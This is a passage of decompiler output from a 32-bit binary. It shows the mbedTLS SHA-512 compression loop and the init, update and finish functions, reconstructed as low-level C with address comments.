            int32_t v129 = v123 + v73 + (int32_t)(v122 < v72) + v126 + (int32_t)(v125 < v122) + (int32_t)(v127 < v125) + (v117 & (v102 ^ v88) ^ v88) + ((v117 / 0x4000 | 0x40000 * v116) ^ (v117 / 0x40000 | 0x4000 * v116) ^ (0x800000 * v117 | v116 / 512)) + (int32_t)(v128 < v127); // 0x80547f8
            uint32_t result = v128 + v77; // 0x80547fe
            uint32_t v130 = v129 + v78 + (int32_t)(result < v77); // 0x8054800
            uint32_t v131 = (v120 | v106) & v91 | v120 & v106; // 0x805483e
            uint32_t v132 = ((16 * v121 | v120 / 0x10000000) ^ (v121 / 4 | 0x40000000 * v120) ^ (v121 / 128 | 0x2000000 * v120)) + v131; // 0x80548da
            uint32_t v133 = v132 + v128; // 0x80548f2
            uint32_t v134 = ((v121 / 0x10000000 | 16 * v120) ^ (0x40000000 * v121 | v120 / 4) ^ (0x2000000 * v121 | v120 / 128)) + ((v121 | v107) & v92 | v121 & v107) + (int32_t)(v132 < v131) + v129 + (int32_t)(v133 < v132); // 0x805490a
            uint32_t v135 = *(int32_t *)(v63 - 616 + v2) + v87; // 0x8054916
            int32_t v136 = *(int32_t *)(v63 - 612 + v2); // 0x805491d
            int32_t v137 = *(int32_t *)(v63 + (int32_t)&g36); // 0x8054924
            uint32_t v138 = v137 + v135; // 0x8054924
            int32_t v139 = *(int32_t *)(v63 + (int32_t)&g37); // 0x805492b
            uint32_t v140 = (result & (v116 ^ v101) ^ v101) + v138; // 0x8054962
            uint32_t v141 = ((0x4000 * v130 | result / 0x40000) ^ (0x40000 * v130 | result / 0x4000) ^ (v130 / 512 | 0x800000 * result)) + v140; // 0x8054a00
            int32_t v142 = v136 + v88 + (int32_t)(v135 < v87) + v139 + (int32_t)(v138 < v135) + (int32_t)(v140 < v138) + (v130 & (v117 ^ v102) ^ v102) + ((v130 / 0x4000 | 0x40000 * result) ^ (v130 / 0x40000 | 0x4000 * result) ^ (0x800000 * v130 | result / 512)) + (int32_t)(v141 < v140); // 0x8054a06
            uint32_t v143 = v141 + v91; // 0x8054a0c
            uint32_t v144 = v142 + v92 + (int32_t)(v143 < v91); // 0x8054a0e
            uint32_t v145 = (v133 | v120) & v106 | v133 & v120; // 0x8054a46
            uint32_t v146 = ((16 * v134 | v133 / 0x10000000) ^ (v134 / 4 | 0x40000000 * v133) ^ (v134 / 128 | 0x2000000 * v133)) + v145; // 0x8054ae8
            uint32_t v147 = v146 + v141; // 0x8054af4
            v18 = v147;
            uint32_t v148 = ((v134 / 0x10000000 | 16 * v133) ^ (0x40000000 * v134 | v133 / 4) ^ (0x2000000 * v134 | v133 / 128)) + ((v134 | v121) & v107 | v134 & v121) + (int32_t)(v146 < v145) + v142 + (int32_t)(v147 < v146); // 0x8054afc
            v47 = v148;
            uint32_t v149 = *(int32_t *)(v63 - 608 + v2) + v101; // 0x8054b04
            int32_t v150 = *(int32_t *)(v63 - 604 + v2); // 0x8054b0b
            int32_t v151 = *(int32_t *)(v63 + (int32_t)&g38); // 0x8054b18
            uint32_t v152 = v151 + v149; // 0x8054b1f
            int32_t v153 = *(int32_t *)(v63 + (int32_t)&g39); // 0x8054b2b
            uint32_t v154 = (v143 & (result ^ v116) ^ v116) + v152; // 0x8054b86
            uint32_t v155 = ((0x4000 * v144 | v143 / 0x40000) ^ (0x40000 * v144 | v143 / 0x4000) ^ (v144 / 512 | 0x800000 * v143)) + v154; // 0x8054c14
            int32_t v156 = v150 + v102 + (int32_t)(v149 < v101) + v153 + (int32_t)(v152 < v149) + (int32_t)(v154 < v152) + (v144 & (v130 ^ v117) ^ v117) + ((v144 / 0x4000 | 0x40000 * v143) ^ (v144 / 0x40000 | 0x4000 * v143) ^ (0x800000 * v144 | v143 / 512)) + (int32_t)(v155 < v154); // 0x8054c20
            uint32_t v157 = v155 + v106; // 0x8054c2c
            uint32_t v158 = v156 + v107 + (int32_t)(v157 < v106); // 0x8054c38
            int32_t v159 = 0x40000000 * v147 | v148 / 4; // 0x8054c7a
            uint32_t v160 = (v133 | v147) & v120 | v133 & v147; // 0x8054c7e
            uint32_t v161 = v160 + (v159 ^ (v147 / 0x10000000 | 16 * v148) ^ (0x2000000 * v147 | v148 / 128)); // 0x8054cf6
            uint32_t v162 = v155 + v161; // 0x8054d1a
            uint32_t v163 = (int32_t)(v161 < v160) + ((v147 / 4 | 0x40000000 * v148) ^ (16 * v147 | v148 / 0x10000000) ^ (v147 / 128 | 0x2000000 * v148)) + ((v134 | v148) & v121 | v134 & v148) + v156 + (int32_t)(v162 < v161); // 0x8054d2c
            uint32_t v164 = *(int32_t *)(v63 - 600 + v2) + v116; // 0x8054d38
            int32_t v165 = *(int32_t *)(v63 - 596 + v2); // 0x8054d3f
            int32_t v166 = *(int32_t *)(v63 + (int32_t)&g40); // 0x8054d52
            uint32_t v167 = v166 + v164; // 0x8054d59
            int32_t v168 = *(int32_t *)(v63 + (int32_t)&g41); // 0x8054d65
            uint32_t v169 = (v157 & (v143 ^ result) ^ result) + v167; // 0x8054db4
            uint32_t v170 = ((0x4000 * v158 | v157 / 0x40000) ^ (0x40000 * v158 | v157 / 0x4000) ^ (v158 / 512 | 0x800000 * v157)) + v169; // 0x8054e54
            int32_t v171 = v165 + v117 + (int32_t)(v164 < v116) + v168 + (int32_t)(v167 < v164) + (int32_t)(v169 < v167) + (v158 & (v144 ^ v130) ^ v130) + ((v158 / 0x4000 | 0x40000 * v157) ^ (v158 / 0x40000 | 0x4000 * v157) ^ (0x800000 * v158 | v157 / 512)) + (int32_t)(v170 < v169); // 0x8054e5a
            int32_t v172 = v170 + v120; // 0x8054e66
            int32_t v173 = v171 + v121 + (int32_t)(v172 < v120); // 0x8054e6c
            int32_t v174 = v47; // 0x8054e96
            int32_t v175 = v18; // 0x8054ea0
            uint32_t v176 = (v162 | v175) & v133 | v162 & v175; // 0x8054ebe
            int32_t v177 = v163 / 4 | 0x40000000 * v162; // 0x8054ece
            uint32_t v178 = (v177 ^ (16 * v163 | v162 / 0x10000000) ^ (v163 / 128 | 0x2000000 * v162)) + v176; // 0x8054f4e
            uint32_t v179 = v178 + v170; // 0x8054f6c
            int32_t v180 = ((v163 / 0x10000000 | 16 * v162) ^ (0x40000000 * v163 | v162 / 4) ^ (0x2000000 * v163 | v162 / 128)) + ((v163 | v174) & v134 | v163 & v174) + (int32_t)(v178 < v176) + v171 + (int32_t)(v179 < v178); // 0x8054f72
            int32_t v181 = v62 + 8; // 0x8054f78
            // branch -> 0x8053e10
            while (v181 != 80) {
                // 0x8053e10
                v47 = v174;
                v48 = v173;
                v49 = v172;
                v50 = v158;
                v51 = v157;
                v53 = v133;
                v54 = v163;
                v55 = v162;
                v56 = v180;
                v57 = v179;
                v58 = v144;
                v59 = v143;
                v61 = result;
                v62 = v181;
                v63 = 8 * v62;
                v64 = *(int32_t *)(v2 - 656 + v63) + v61;
                v65 = *(int32_t *)(v2 - 652 + v63);
                v66 = *(int32_t *)(v63 + (int32_t)&Hash_constant_words_K_for_SHA_384_and_SHA_512_at_8078ec0);
                v67 = *(int32_t *)(v63 + (int32_t)&g27);
                v68 = v66 + v64;
                v69 = v68 + ((v49 / 0x4000 | 0x40000 * v48) ^ (v49 / 0x40000 | 0x4000 * v48) ^ (0x800000 * v49 | v48 / 512));
                v70 = v69 + ((v59 ^ v51) & v49 ^ v59);
                v71 = ((v58 ^ v50) & v48 ^ v58) + ((0x40000 * v49 | v48 / 0x4000) ^ (0x4000 * v49 | v48 / 0x40000) ^ (v49 / 512 | 0x800000 * v48)) + v67 + v65 + v130 + (int32_t)(v64 < v61) + (int32_t)(v68 < v64) + (int32_t)(v69 < v68) + (int32_t)(v70 < v69);
                v72 = v70 + v53;
                v73 = (int32_t)(v72 < v53) + v134 + v71;
                v74 = v175 & (v57 | v55) | v57 & v55;
                v75 = v74 + ((0x40000000 * v57 | v56 / 4) ^ (v57 / 0x10000000 | 16 * v56) ^ (0x2000000 * v57 | v56 / 128));
                v76 = v75 + v70;
                v77 = v76;
                v78 = (v47 & (v56 | v54) | v56 & v54) + ((16 * v57 | v56 / 0x10000000) ^ (v57 / 4 | 0x40000000 * v56) ^ (v57 / 128 | 0x2000000 * v56)) + (int32_t)(v75 < v74) + v71 + (int32_t)(v76 < v75);
                v79 = *(int32_t *)(v63 - 648 + v2) + v59;
                v80 = *(int32_t *)(v63 - 644 + v2);
                v81 = *(int32_t *)(v63 + (int32_t)&g28);
                v82 = *(int32_t *)(v63 + (int32_t)&g29);
                v83 = v81 + v79;
                v84 = v83 + (v72 & (v51 ^ v49) ^ v51);
                v85 = ((0x40000 * v73 | v72 / 0x4000) ^ (0x4000 * v73 | v72 / 0x40000) ^ (v73 / 512 | 0x800000 * v72)) + v84;
                v86 = v80 + v58 + (int32_t)(v79 < v59) + v82 + (int32_t)(v83 < v79) + (int32_t)(v84 < v83) + (v73 & (v50 ^ v48) ^ v50) + ((v73 / 0x4000 | 0x40000 * v72) ^ (v73 / 0x40000 | 0x4000 * v72) ^ (0x800000 * v73 | v72 / 512)) + (int32_t)(v85 < v84);
                v87 = v85 + v18;
                v88 = v86 + v47 + (int32_t)(v87 < v85);
                v89 = (v76 | v57) & v55 | v76 & v57;
                v90 = ((v76 / 0x10000000 | 16 * v78) ^ (0x40000000 * v76 | v78 / 4) ^ (0x2000000 * v76 | v78 / 128)) + v89;
                v91 = v90 + v85;
                v92 = ((16 * v76 | v78 / 0x10000000) ^ (v76 / 4 | 0x40000000 * v78) ^ (v76 / 128 | 0x2000000 * v78)) + ((v78 | v56) & v54 | v78 & v56) + (int32_t)(v90 < v89) + v86 + (int32_t)(v91 < v90);
                v93 = *(int32_t *)(v63 - 640 + v2) + v51;
                v94 = *(int32_t *)(v63 - 636 + v2);
                v95 = *(int32_t *)(v63 + (int32_t)&g30);
                v96 = v95 + v93;
                v97 = *(int32_t *)(v63 + (int32_t)&g31);
                v98 = (v87 & (v72 ^ v49) ^ v49) + v96;
                v99 = ((0x40000 * v88 | v87 / 0x4000) ^ (0x4000 * v88 | v87 / 0x40000) ^ (v88 / 512 | 0x800000 * v87)) + v98;
                v100 = v94 + v50 + (int32_t)(v93 < v51) + v97 + (int32_t)(v96 < v93) + (int32_t)(v98 < v96) + (v88 & (v73 ^ v48) ^ v48) + ((v88 / 0x4000 | 0x40000 * v87) ^ (v88 / 0x40000 | 0x4000 * v87) ^ (0x800000 * v88 | v87 / 512)) + (int32_t)(v99 < v98);
                v101 = v99 + v55;
                v102 = v100 + v54 + (int32_t)(v101 < v55);
                v103 = v77;
                v104 = (v103 | v91) & v57 | v103 & v91;
                v105 = ((16 * v92 | v91 / 0x10000000) ^ (v92 / 4 | 0x40000000 * v91) ^ (v92 / 128 | 0x2000000 * v91)) + v104;
                v106 = v105 + v99;
                v107 = ((v92 / 0x10000000 | 16 * v91) ^ (0x40000000 * v92 | v91 / 4) ^ (0x2000000 * v92 | v91 / 128)) + ((v92 | v78) & v56 | v92 & v78) + (int32_t)(v105 < v104) + v100 + (int32_t)(v106 < v105);
                v108 = *(int32_t *)(v63 - 632 + v2) + v49;
                v109 = *(int32_t *)(v63 - 628 + v2);
                v110 = *(int32_t *)(v63 + (int32_t)&g32);
                v111 = v110 + v108;
                v112 = *(int32_t *)(v63 + (int32_t)&g33);
                v113 = (v101 & (v87 ^ v72) ^ v72) + v111;
                v114 = ((0x4000 * v102 | v101 / 0x40000) ^ (0x40000 * v102 | v101 / 0x4000) ^ (v102 / 512 | 0x800000 * v101)) + v113;
                v115 = v109 + v48 + (int32_t)(v108 < v49) + v112 + (int32_t)(v111 < v108) + (int32_t)(v113 < v111) + (v102 & (v88 ^ v73) ^ v73) + ((v102 / 0x4000 | 0x40000 * v101) ^ (v102 / 0x40000 | 0x4000 * v101) ^ (0x800000 * v102 | v101 / 512)) + (int32_t)(v114 < v113);
                v116 = v114 + v57;
                v117 = v115 + v56 + (int32_t)(v116 < v57);
                v118 = (v106 | v91) & v77 | v106 & v91;
                v119 = ((16 * v107 | v106 / 0x10000000) ^ (v107 / 4 | 0x40000000 * v106) ^ (v107 / 128 | 0x2000000 * v106)) + v118;
                v120 = v119 + v114;
                v121 = ((v107 / 0x10000000 | 16 * v106) ^ (0x40000000 * v107 | v106 / 4) ^ (0x2000000 * v107 | v106 / 128)) + ((v107 | v92) & v78 | v107 & v92) + (int32_t)(v119 < v118) + v115 + (int32_t)(v120 < v119);
                v122 = *(int32_t *)(v63 - 624 + v2) + v72;
                v123 = *(int32_t *)(v63 - 620 + v2);
                v124 = *(int32_t *)(v63 + (int32_t)&g34);
                v125 = v124 + v122;
                v126 = *(int32_t *)(v63 + (int32_t)&g35);
                v127 = (v116 & (v101 ^ v87) ^ v87) + v125;
                v128 = ((0x4000 * v117 | v116 / 0x40000) ^ (0x40000 * v117 | v116 / 0x4000) ^ (v117 / 512 | 0x800000 * v116)) + v127;
                v129 = v123 + v73 + (int32_t)(v122 < v72) + v126 + (int32_t)(v125 < v122) + (int32_t)(v127 < v125) + (v117 & (v102 ^ v88) ^ v88) + ((v117 / 0x4000 | 0x40000 * v116) ^ (v117 / 0x40000 | 0x4000 * v116) ^ (0x800000 * v117 | v116 / 512)) + (int32_t)(v128 < v127);
                result = v128 + v77;
                v130 = v129 + v78 + (int32_t)(result < v77);
                v131 = (v120 | v106) & v91 | v120 & v106;
                v132 = ((16 * v121 | v120 / 0x10000000) ^ (v121 / 4 | 0x40000000 * v120) ^ (v121 / 128 | 0x2000000 * v120)) + v131;
                v133 = v132 + v128;
                v134 = ((v121 / 0x10000000 | 16 * v120) ^ (0x40000000 * v121 | v120 / 4) ^ (0x2000000 * v121 | v120 / 128)) + ((v121 | v107) & v92 | v121 & v107) + (int32_t)(v132 < v131) + v129 + (int32_t)(v133 < v132);
                v135 = *(int32_t *)(v63 - 616 + v2) + v87;
                v136 = *(int32_t *)(v63 - 612 + v2);
                v137 = *(int32_t *)(v63 + (int32_t)&g36);
                v138 = v137 + v135;
                v139 = *(int32_t *)(v63 + (int32_t)&g37);
                v140 = (result & (v116 ^ v101) ^ v101) + v138;
                v141 = ((0x4000 * v130 | result / 0x40000) ^ (0x40000 * v130 | result / 0x4000) ^ (v130 / 512 | 0x800000 * result)) + v140;
                v142 = v136 + v88 + (int32_t)(v135 < v87) + v139 + (int32_t)(v138 < v135) + (int32_t)(v140 < v138) + (v130 & (v117 ^ v102) ^ v102) + ((v130 / 0x4000 | 0x40000 * result) ^ (v130 / 0x40000 | 0x4000 * result) ^ (0x800000 * v130 | result / 512)) + (int32_t)(v141 < v140);
                v143 = v141 + v91;
                v144 = v142 + v92 + (int32_t)(v143 < v91);
                v145 = (v133 | v120) & v106 | v133 & v120;
                v146 = ((16 * v134 | v133 / 0x10000000) ^ (v134 / 4 | 0x40000000 * v133) ^ (v134 / 128 | 0x2000000 * v133)) + v145;
                v147 = v146 + v141;
                v18 = v147;
                v148 = ((v134 / 0x10000000 | 16 * v133) ^ (0x40000000 * v134 | v133 / 4) ^ (0x2000000 * v134 | v133 / 128)) + ((v134 | v121) & v107 | v134 & v121) + (int32_t)(v146 < v145) + v142 + (int32_t)(v147 < v146);
                v47 = v148;
                v149 = *(int32_t *)(v63 - 608 + v2) + v101;
                v150 = *(int32_t *)(v63 - 604 + v2);
                v151 = *(int32_t *)(v63 + (int32_t)&g38);
                v152 = v151 + v149;
                v153 = *(int32_t *)(v63 + (int32_t)&g39);
                v154 = (v143 & (result ^ v116) ^ v116) + v152;
                v155 = ((0x4000 * v144 | v143 / 0x40000) ^ (0x40000 * v144 | v143 / 0x4000) ^ (v144 / 512 | 0x800000 * v143)) + v154;
                v156 = v150 + v102 + (int32_t)(v149 < v101) + v153 + (int32_t)(v152 < v149) + (int32_t)(v154 < v152) + (v144 & (v130 ^ v117) ^ v117) + ((v144 / 0x4000 | 0x40000 * v143) ^ (v144 / 0x40000 | 0x4000 * v143) ^ (0x800000 * v144 | v143 / 512)) + (int32_t)(v155 < v154);
                v157 = v155 + v106;
                v158 = v156 + v107 + (int32_t)(v157 < v106);
                v159 = 0x40000000 * v147 | v148 / 4;
                v160 = (v133 | v147) & v120 | v133 & v147;
                v161 = v160 + (v159 ^ (v147 / 0x10000000 | 16 * v148) ^ (0x2000000 * v147 | v148 / 128));
                v162 = v155 + v161;
                v163 = (int32_t)(v161 < v160) + ((v147 / 4 | 0x40000000 * v148) ^ (16 * v147 | v148 / 0x10000000) ^ (v147 / 128 | 0x2000000 * v148)) + ((v134 | v148) & v121 | v134 & v148) + v156 + (int32_t)(v162 < v161);
                v164 = *(int32_t *)(v63 - 600 + v2) + v116;
                v165 = *(int32_t *)(v63 - 596 + v2);
                v166 = *(int32_t *)(v63 + (int32_t)&g40);
                v167 = v166 + v164;
                v168 = *(int32_t *)(v63 + (int32_t)&g41);
                v169 = (v157 & (v143 ^ result) ^ result) + v167;
                v170 = ((0x4000 * v158 | v157 / 0x40000) ^ (0x40000 * v158 | v157 / 0x4000) ^ (v158 / 512 | 0x800000 * v157)) + v169;
                v171 = v165 + v117 + (int32_t)(v164 < v116) + v168 + (int32_t)(v167 < v164) + (int32_t)(v169 < v167) + (v158 & (v144 ^ v130) ^ v130) + ((v158 / 0x4000 | 0x40000 * v157) ^ (v158 / 0x40000 | 0x4000 * v157) ^ (0x800000 * v158 | v157 / 512)) + (int32_t)(v170 < v169);
                v172 = v170 + v120;
                v173 = v171 + v121 + (int32_t)(v172 < v120);
                v174 = v47;
                v175 = v18;
                v176 = (v162 | v175) & v133 | v162 & v175;
                v177 = v163 / 4 | 0x40000000 * v162;
                v178 = (v177 ^ (16 * v163 | v162 / 0x10000000) ^ (v163 / 128 | 0x2000000 * v162)) + v176;
                v179 = v178 + v170;
                v180 = ((v163 / 0x10000000 | 16 * v162) ^ (0x40000000 * v163 | v162 / 4) ^ (0x2000000 * v163 | v162 / 128)) + ((v163 | v174) & v134 | v163 & v174) + (int32_t)(v178 < v176) + v171 + (int32_t)(v179 < v178);
                v181 = v62 + 8;
                // continue -> 0x8053e10
            }
            // 0x8054f8c
            v15 = a1;
            uint32_t v182 = v179 + v44; // 0x8054f95
            *(int32_t *)(a1 + 16) = v182;
            g4 = v162;
            int32_t * v183 = (int32_t *)(v15 + 24); // 0x8054fb0_0
            uint32_t v184 = *v183; // 0x8054fb0
            uint32_t v185 = v184 + v162; // 0x8054fb0
            *v183 = v185;
            *(int32_t *)(v15 + 20) = (int32_t)(v182 < v179) + v45 + v180;
            int32_t * v186 = (int32_t *)(v15 + 28); // 0x8054fc2_0
            *v186 = *v186 + v163 + (int32_t)(v185 < v184);
            int32_t * v187 = (int32_t *)(v15 + 32); // 0x8054fc5_0
            uint32_t v188 = *v187; // 0x8054fc5
            uint32_t v189 = v18 + v188; // 0x8054fc5
            *v187 = v189;
            int32_t * v190 = (int32_t *)(v15 + 36); // 0x8054fce_0
            *v190 = v47 + *v190 + (int32_t)(v189 < v188);
            int32_t * v191 = (int32_t *)(v15 + 40); // 0x8054fd7_0
            uint32_t v192 = *v191; // 0x8054fd7
            uint32_t v193 = v192 + v133; // 0x8054fd7
            *v191 = v193;
            int32_t * v194 = (int32_t *)(v15 + 44); // 0x8054fe0_0
            *v194 = *v194 + v134 + (int32_t)(v193 < v192);
            int32_t * v195 = (int32_t *)(v15 + 48); // 0x8054fe9_0
            uint32_t v196 = *v195; // 0x8054fe9
            uint32_t v197 = v196 + v172; // 0x8054fe9
            *v195 = v197;
            int32_t * v198 = (int32_t *)(v15 + 52); // 0x8054ff2_0
            *v198 = *v198 + v173 + (int32_t)(v197 < v196);
            int32_t * v199 = (int32_t *)(v15 + 56); // 0x8054ff5_0
            uint32_t v200 = *v199; // 0x8054ff5
            uint32_t v201 = v200 + v157; // 0x8054ff5
            *v199 = v201;
            int32_t * v202 = (int32_t *)(v15 + 60); // 0x8054ffe_0
            *v202 = *v202 + v158 + (int32_t)(v201 < v200);
            int32_t * v203 = (int32_t *)(v15 + 64); // 0x8055007_0
            uint32_t v204 = *v203; // 0x8055007
            uint32_t v205 = v204 + v143; // 0x8055007
            *v203 = v205;
            int32_t * v206 = (int32_t *)(v15 + 68); // 0x8055010_0
            *v206 = *v206 + v144 + (int32_t)(v205 < v204);
            g6 = v130;
            int32_t * v207 = (int32_t *)(v15 + 72); // 0x8055019_0
            uint32_t v208 = *v207; // 0x8055019
            uint32_t v209 = v208 + result; // 0x8055019
            *v207 = v209;
            int32_t * v210 = (int32_t *)(v15 + 76); // 0x805501c_0
            *v210 = *v210 + v130 + (int32_t)(v209 < v208);
            return result;
        }
        // 0x8053b90
        v3 = a2;
        v4 = v16;
        // branch -> 0x8053b90
    }
}

// Address range: 0x8055030 - 0x805504f
int32_t mbedtls_sha512_init(char * a1) {
    // 0x8055030
    memset(a1, 0, 53);
    return 0;
}

// Address range: 0x8055050 - 0x805518f
int32_t mbedtls_sha512_update(char * a1, char * a2, uint32_t a3) {
    int32_t v1 = g5; // 0x8055053
    int32_t v2 = g7; // 0x8055054
    int32_t v3 = g3; // 0x8055055
    g3 = a3;
    int32_t v4 = (int32_t)a1;
    g7 = v4;
    g5 = (int32_t)a2;
    if (a3 == 0) {
        // 0x80550ed
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    int32_t v5 = *(int32_t *)a1 % 128; // 0x8055080
    uint32_t v6 = 128 - v5; // 0x8055086
    int32_t v7 = *(int32_t *)a1 + a3; // 0x805508c
    g1 = v7;
    int32_t v8 = (int32_t)(v7 < a3) + *(int32_t *)(v4 + 4); // 0x805508e
    g6 = v8;
    *(int32_t *)a1 = v7;
    *(int32_t *)(g7 + 4) = g6;
    int32_t v9;
    int32_t v10;
    int32_t v11; // 0x80550e9
    int32_t v12; // 0x80550b1
    if (v8 == 0) {
        // 0x8055180
        if (g1 < a3) {
            int32_t * v13 = (int32_t *)(g7 + 8); // 0x80550fe_0
            int32_t v14 = *v13; // 0x80550fe
            *v13 = v14 + 1;
            int32_t * v15 = (int32_t *)(g7 + 12); // 0x8055102_0
            *v15 = (int32_t)(v14 == -1) + *v15;
            int32_t v16 = g3; // 0x8055106
            v12 = v16;
            v9 = v5;
            if (v16 >= v6) {
                v10 = v5;
              lab_0x8055130:
                // 0x8055130
                g1 = v10;
                if (v10 == 0) {
                  lab_0x8055130_2:
                    // 0x8055130
                    v12 = g3;
                    v9 = 0;
                    // branch -> 0x80550aa
                } else {
                  lab_0x805513b:;
                    int32_t v17 = g7 + 80; // 0x805513e
                    memcpy((char *)(v17 + v10), (char *)g5, v6);
                    g1 = mbedtls_sha512_process(g7, v17);
                    g5 += v6;
                    v12 = g3 - v6;
                    v9 = 0;
                    // branch -> 0x80550aa
                }
                // 0x80550aa
                v11 = v12;
                if (v12 >= 128) {
                  lab_0x80550af_2:;
                    int32_t v18 = 0; // 0x80550b8
                    g3 = v18 + 128;
                    mbedtls_sha512_process(g7, g5 + v18);
                    // branch -> 0x80550b8
                    while (v12 - g3 > 127) {
                        // 0x80550b8
                        v18 = g3;
                        g3 = v18 + 128;
                        mbedtls_sha512_process(g7, g5 + v18);
                        // continue -> 0x80550b8
                    }
                    uint32_t v19 = v12 - 128; // 0x80550d7
                    g1 = v19 & -128;
                    v11 = v19 % 128;
                    // branch -> 0x80550e9
                }
              lab_0x80550e9_2:
                // 0x80550e9
                if (v11 != 0) {
                    // 0x8055110
                    g6 = v9;
                    int32_t v20 = g7; // 0x8055119
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    int32_t v21;
                    int32_t v22;
                    memcpy((char *)v22, (char *)v21, v9 + 80 + v20);
                    v10 = v9;
                    // branch -> 0x8055130
                    goto lab_0x8055130;
                }
                // 0x80550e9
                // branch -> 0x80550ed
                // 0x80550ed
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return g1;
            }
            // 0x80550aa
            if (v12 < 128) {
                v11 = v12;
                goto lab_0x80550e9_2;
            }
            goto lab_0x80550af_2;
        }
    }
    int32_t v23 = g3; // 0x80550a1
    v12 = v23;
    v9 = v5;
    if (v23 >= v6) {
        v10 = v5;
        // 0x8055130
        g1 = v10;
        if (v10 == 0) {
            goto lab_0x8055130_2;
        }
        goto lab_0x805513b;
    }
    // 0x80550aa
    if (v12 < 128) {
        v11 = v12;
        goto lab_0x80550e9_2;
    }
    goto lab_0x80550af_2;
}

// Address range: 0x8055190 - 0x805552f
// Used cryptographic patterns:
//  - padding_used_in_hashing_algorithms__0x80_0_____0_ (8-bit, little endian)
int32_t mbedtls_sha512_finish(int32_t * a1, char * a2, int32_t a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g7; // 0x8055193
    int32_t v3 = g3; // 0x8055194
    g3 = v1;
    g7 = (int32_t)a2;
    int32_t v4 = 8 * *(int32_t *)(v1 + 12); // 0x80551a7
    int32_t v5 = v4 / 0x1000000;
    g4 = v4 | *(int32_t *)(v1 + 8) / 0x20000000;
    uint32_t v6 = *a1 % 128; // 0x8055271
    g1 = v6;
    int32_t v7 = v6 > 111 ? 240 : 112;
    mbedtls_sha512_update((char *)a1, "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", v7 - v6);
    g1 = &v5;
    mbedtls_sha512_update((char *)g3, (char *)&v5, 16);
    *(char *)g7 = *(char *)(g3 + 23);
    *(char *)(g7 + 1) = (char)*(int16_t *)(g3 + 22);
    *(char *)(g7 + 2) = (char)(*(int32_t *)(g3 + 20) / 256);
    *(char *)(g7 + 3) = (char)*(int32_t *)(g3 + 20);
    *(char *)(g7 + 4) = (char)(*(int32_t *)(g3 + 16) / 0x1000000);
    *(char *)(g7 + 5) = (char)(*(int32_t *)(g3 + 16) / 0x10000);
    *(char *)(g7 + 6) = (char)(*(int32_t *)(g3 + 16) / 256);
    *(char *)(g7 + 7) = (char)*(int32_t *)(g3 + 16);
    *(char *)(g7 + 8) = *(char *)(g3 + 31);
    *(char *)(g7 + 9) = (char)*(int16_t *)(g3 + 30);
    *(char *)(g7 + 10) = (char)(*(int32_t *)(g3 + 28) / 256);
    *(char *)(g7 + 11) = (char)*(int32_t *)(g3 + 28);
    *(char *)(g7 + 12) = (char)(*(int32_t *)(g3 + 24) / 0x1000000);
    *(char *)(g7 + 13) = (char)(*(int32_t *)(g3 + 24) / 0x10000);
    *(char *)(g7 + 14) = (char)(*(int32_t *)(g3 + 24) / 256);
    *(char *)(g7 + 15) = (char)*(int32_t *)(g3 + 24);
    *(char *)(g7 + 16) = *(char *)(g3 + 39);
    *(char *)(g7 + 17) = (char)*(int16_t *)(g3 + 38);
    *(char *)(g7 + 18) = (char)(*(int32_t *)(g3 + 36) / 256);
    *(char *)(g7 + 19) = (char)*(int32_t *)(g3 + 36);
    *(char *)(g7 + 20) = (char)(*(int32_t *)(g3 + 32) / 0x1000000);
    *(char *)(g7 + 21) = (char)(*(int32_t *)(g3 + 32) / 0x10000);
    *(char *)(g7 + 22) = (char)(*(int32_t *)(g3 + 32) / 256);
    *(char *)(g7 + 23) = (char)*(int32_t *)(g3 + 32);
    *(char *)(g7 + 24) = *(char *)(g3 + 47);
    *(char *)(g7 + 25) = (char)*(int16_t *)(g3 + 46);
    *(char *)(g7 + 26) = (char)(*(int32_t *)(g3 + 44) / 256);
    *(char *)(g7 + 27) = (char)*(int32_t *)(g3 + 44);
    *(char *)(g7 + 28) = (char)(*(int32_t *)(g3 + 40) / 0x1000000);
    *(char *)(g7 + 29) = (char)(*(int32_t *)(g3 + 40) / 0x10000);
    *(char *)(g7 + 30) = (char)(*(int32_t *)(g3 + 40) / 256);
    *(char *)(g7 + 31) = (char)*(int32_t *)(g3 + 40);
    *(char *)(g7 + 32) = *(char *)(g3 + 55);
    *(char *)(g7 + 33) = (char)*(int16_t *)(g3 + 54);
    *(char *)(g7 + 34) = (char)(*(int32_t *)(g3 + 52) / 256);
    *(char *)(g7 + 35) = (char)*(int32_t *)(g3 + 52);
    *(char *)(g7 + 36) = (char)(*(int32_t *)(g3 + 48) / 0x1000000);
    *(char *)(g7 + 37) = (char)(*(int32_t *)(g3 + 48) / 0x10000);
    *(char *)(g7 + 38) = (char)(*(int32_t *)(g3 + 48) / 256);
    *(char *)(g7 + 39) = (char)*(int32_t *)(g3 + 48);
    *(char *)(g7 + 40) = *(char *)(g3 + 63);
    *(char *)(g7 + 41) = (char)*(int16_t *)(g3 + 62);
    *(char *)(g7 + 42) = (char)(*(int32_t *)(g3 + 60) / 256);
    *(char *)(g7 + 43) = (char)*(int32_t *)(g3 + 60);
    *(char *)(g7 + 44) = (char)(*(int32_t *)(g3 + 56) / 0x1000000);
    *(char *)(g7 + 45) = (char)(*(int32_t *)(g3 + 56) / 0x10000);
    *(char *)(g7 + 46) = (char)(*(int32_t *)(g3 + 56) / 256);
    *(char *)(g7 + 47) = (char)*(int32_t *)(g3 + 56);
    int32_t v8 = *(int32_t *)(g3 + 208); // 0x805546a
    int32_t result = v8; // 0x8055512_2
    if (v8 == 0) {
        // 0x8055478
        *(char *)(g7 + 48) = *(char *)(g3 + 71);
        *(char *)(g7 + 49) = (char)*(int16_t *)(g3 + 70);
        *(char *)(g7 + 50) = (char)(*(int32_t *)(g3 + 68) / 256);
        *(char *)(g7 + 51) = (char)*(int32_t *)(g3 + 68);
        *(char *)(g7 + 52) = (char)(*(int32_t *)(g3 + 64) / 0x1000000);
        *(char *)(g7 + 53) = (char)(*(int32_t *)(g3 + 64) / 0x10000);
